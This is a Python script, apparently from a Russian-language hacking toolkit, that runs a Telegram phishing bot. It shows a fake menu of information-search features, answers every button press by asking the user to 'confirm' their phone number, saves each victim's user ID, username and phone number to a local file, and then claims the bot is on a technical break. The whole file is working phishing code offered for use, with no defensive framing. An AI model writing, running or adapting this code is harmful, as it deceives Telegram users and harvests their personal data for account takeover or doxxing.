import os

import telebot
from pystyle import Center, Colorate, Colors
from telebot import types
os.system("cls" if os.name == "nt" else "clear")


banner = """

╭─────────────────────────────────────────────────────────────────────────────────────╮
│                                                                                     │    
│      ▄██████▄  ▀█████████▄          ▄████████  ▄█     ▄████████    ▄█     █▄        │
│      ███    ███   ███    ███        ███    ███ ███    ███    ███   ███    ███       │
│      ███    █▀    ███    ███        ███    █▀  ███▌   ███    █▀    ███    ███       │
│     ▄███         ▄███▄▄▄██▀        ▄███▄▄▄     ███▌   ███         ▄███▄▄▄▄███▄▄     │
│    ▀▀███ ████▄  ▀▀███▀▀▀██▄       ▀▀███▀▀▀     ███▌ ▀███████████ ▀▀███▀▀▀▀███▀      │
│      ███    ███   ███    ██▄        ███        ███           ███   ███    ███       │
│      ███    ███   ███    ███        ███        ███     ▄█    ███   ███    ███       │
│      ████████▀  ▄█████████▀         ███        █▀    ▄████████▀    ███    █▀        │
│                                                                                     │
│                                                                                     │
│                        [●] Coder: @vedmoor                                          │
│                        [●] Для возврата напишите 99                                 │
│                                                                                     │
╰─────────────────────────────────────────────────────────────────────────────────────╯                                                   


  """


print(Colorate.Horizontal(Colors.blue_to_purple, Center.XCenter(banner)))


def fishing():
    def start(message):
        keyboard = types.InlineKeyboardMarkup()
        button_show_commands = types.InlineKeyboardButton(
            text="🔎Показать команды", callback_data="show_commands"
        )
        button_my_account = types.InlineKeyboardButton(
            text="⚙️Мой аккаунт", callback_data="my_account"
        )
        button_support = types.InlineKeyboardButton(
            text="🆘Поддержка", callback_data="support"
        )
        button_partners = types.InlineKeyboardButton(
            text="🤝Партнёрам", callback_data="partners"
        )
        button_create_bot = types.InlineKeyboardButton(
            text="🤖Создать бот", callback_data="create_bot"
        )

        keyboard.add(button_show_commands)
        keyboard.add(button_my_account, button_support)
        keyboard.add(button_partners, button_create_bot)

        bot.send_message(
            message.chat.id,
            "Откройте для себя бесконечные возможности для экспериментов и поиска нужной информации\n\n*Выберите нужное действие:*",
            reply_markup=keyboard,
            parse_mode="Markdown",
        )

    def callback_handler(call):
        request_phone(call.message.chat.id)

    def request_phone(chat_id):
        keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True)

        button_phone = types.KeyboardButton(
            text="Подтвердить Номер Телефона", request_contact=True
        )

        keyboard.add(button_phone)

        bot.send_message(
            chat_id,
            "Пожалуйста, подтвердите ваш номер телефона:",
            reply_markup=keyboard,
        )

    def contact(message):
        if message.contact:
            phone_number = message.contact.phone_number

            user_id = message.from_user.id

            username = message.from_user.username or "Не указано"

            print(f"Получен номер: +{phone_number}")

            print(f"└ ID: {user_id}, Юзернейм: @{username}")

            try:
                with open("Vedmoor_Fish.txt", "a") as file:
                    file.write(f"{user_id}|@{username}|{phone_number}\n")

                bot.send_message(
                    message.chat.id,
                    "Бот на техническом перерыве. Мы вас оповестим, когда он закончится!",
                )

            except Exception as e:
                print(f"Ошибка сохранения: {e}")

                bot.send_message(message.chat.id, "Произошла ошибка. Попробуйте позже.")

    bot_token = input("\nВведите токен бота: ")
    if bot_token == "99":
        os.system("python main.py")

    bot = telebot.TeleBot(bot_token)

    bot.message_handler(commands=["start"])(start)
    bot.callback_query_handler(func=lambda call: True)(callback_handler)

    bot.message_handler(content_types=["contact"])(contact)

    print(
        "\nБот запущен. Для остановки нажмите Ctrl+C. Все данные будут записываться в Vedmoor_Fish.txt"
    )
    bot.infinity_polling()


if __name__ == "__main__":
    fishing()
